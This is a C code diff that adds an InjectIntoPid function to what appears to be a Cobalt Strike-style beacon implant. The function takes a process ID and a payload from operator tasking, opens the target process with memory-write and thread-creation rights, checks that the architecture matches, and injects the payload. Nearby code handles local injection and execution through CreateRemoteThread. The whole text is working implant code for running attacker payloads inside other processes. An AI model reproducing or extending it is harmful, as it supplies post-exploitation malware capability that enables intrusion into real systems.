@@ -190,7 +190,6 @@ BOOL IsProcess64Bit(HANDLE hProcess)
 	return !IsWow64ProcessEx(hProcess);
 }
 
-
 typedef struct _PAYLOAD
 {
 	SHORT mzSignature;
@@ -358,6 +357,45 @@ char* InjectLocally(char* payload, int size)
 	VirtualFree(pAlloc, 0, MEM_RELEASE);
 
 	return NULL;
+}
+
+void InjectIntoPid(char* buffer, int length, BOOL x86)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+
+	int pid = BeaconDataInt(&parser);
+	int payloadOffset = BeaconDataInt(&parser);
+
+	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
+	if (hProcess == NULL)
+	{
+		int lastError = GetLastError();
+		LERROR("Could not open process %d: %s", pid, LAST_ERROR_STR(lastError));
+		BeaconErrorDD(ERROR_OPEN_PROCESS_FAILED, pid, lastError);
+		return;
+	}
+
+	BOOL isProcessX64 = IsProcess64Bit(hProcess);
+	if(x86 == isProcessX64)
+	{
+		int type;
+		if (isProcessX64)
+		{
+			LERROR("%d is a x64 process (can't inject x86 content)", pid);
+			type = ERROR_INJECT_X86_INTO_X64;
+		} else {
+			LERROR("%d is a x86 process (can't inject x64 content)", pid);
+			type = ERROR_INJECT_X64_INTO_X86;
+		}
+		BeaconErrorD(type, pid);
+		return;
+	}
+
+	int len = BeaconDataLength(&parser);
+	char* payload = BeaconDataBuffer(&parser);
+	BeaconInjectProcess(hProcess, pid, payload, len, payloadOffset, NULL, 0);
+	CloseHandle(hProcess);
 }
 
 BOOL ExecuteViaCreateRemoteThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)
